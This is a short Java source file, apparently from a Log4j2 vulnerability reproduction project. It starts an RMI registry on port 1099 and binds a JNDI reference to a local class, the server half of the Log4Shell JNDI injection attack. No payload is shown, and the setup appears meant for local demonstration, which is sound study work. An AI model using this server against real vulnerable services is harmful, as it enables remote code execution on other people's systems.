package com.meijm.log4j2;

import com.sun.jndi.rmi.registry.ReferenceWrapper;

import javax.naming.Context;
import javax.naming.Name;
import javax.naming.NamingException;
import javax.naming.Reference;
import javax.naming.spi.ObjectFactory;
import java.io.IOException;
import java.rmi.AlreadyBoundException;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import java.util.Hashtable;

public class SimpleJndiServer {
    public static void main(String[] args) {
        try {
            Registry registry = LocateRegistry.createRegistry(1099);
            System.out.println("create rmi 1099");
            Reference reference = new Reference("com.meijm.log4j2.JndiObj", "com.meijm.log4j2.JndiObj", null);
            ReferenceWrapper wrapper = new ReferenceWrapper(reference);
            registry.bind("demo", wrapper);
        } catch (RemoteException | NamingException | AlreadyBoundException e) {
            e.printStackTrace();
        }
    }
}
